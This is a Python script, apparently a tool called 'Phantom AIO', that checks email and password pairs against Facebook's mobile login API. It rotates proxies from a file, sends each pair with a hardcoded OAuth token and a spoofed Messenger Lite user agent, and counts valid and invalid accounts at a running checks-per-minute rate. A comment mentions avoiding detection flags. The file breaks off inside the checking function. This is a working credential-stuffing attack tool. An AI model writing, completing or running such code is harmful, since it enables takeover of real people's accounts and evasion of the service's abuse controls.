import os, sys, json, time, random, string, ctypes, concurrent.futures
import requests
import colorama
import pystyle
import uuid
import functools
import datetime
import threading
from colorama import Fore, Style
from random import choice
from json import dumps
from pystyle import System, Colors, Colorate, Write
from concurrent import futures
from uuid import uuid4
from requests import Session
from urllib import parse

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT

invalid = 0
valid = 0
custom = 0
premium = 0
proxy_error = 0
accounts_processed = 0
print()
start_time = time.time()
ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ Facebook Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error}')

def update_console_title():
    global valid, invalid, custom, premium, proxy_error, start_time, accounts_processed
    current_time = time.time()
    elapsed_time = current_time - start_time
    cpm = int((accounts_processed / elapsed_time) * 60)
    ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ Facebook Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error} | CPM : {cpm}')

def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

def facebook_checker(email, password):
    global invalid, valid, custom, premium, proxy_error, accounts_processed
    proxy = choice(open("proxies.txt", "r").readlines()).strip() if len(open("proxies.txt", "r").readlines()) != 0 else None

    session = Session()

    proxy = (choice(open("./proxies.txt", "r").readlines()).strip()
             if len(open("./proxies.txt", "r").readlines()) != 0
             else None)
    if ":" in proxy and len(proxy.split(":")) == 4:
        ip, port, user, pw = proxy.split(":")
        proxy_string = f"http://{user}:{pw}@{ip}:{port}"
    else:
        ip, port = proxy.split(":")
        proxy_string = f"http://{ip}:{port}"

    session.proxies = {
        "http": proxy_string,
        "https": proxy_string
    }

    payload = {
        'email': email,
        'password': password,
        'credentials_type': 'password',
        'error_detail_type': 'button_with_disabled',
        'format': 'json',
        'device_id': 'cdc4558c-4dd4-4fd0-9ba6-d09e0223d5e5',
        'generate_session_cookies': '1',
        'generate_analytics_claim': '1',
        'generate_machine_id': '1'
    }

    headers = {
        "content-type":"application/x-www-form-urlencoded",
        "authority": "b-api.facebook.com" ,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,
        "accept-language": "en-US,en;q=0.9" ,
        "cache-control": "max-age=0" ,
        "authorization": "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16" ,
        "user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; Redmi 7 MIUI/V11.0.6.0.PFLMIXM) [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi 7;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};]" ,
    }

    response = session.post('https://b-api.facebook.com/method/auth.login', data=payload, headers=headers)
    if any(key in response.text for key in ['Invalid username or password',"\":\"Invalid username or email address " ]):
        invalid += 1
        accounts_processed +=1
        update_console_title()
    # check custom despues good sin session para evitar flag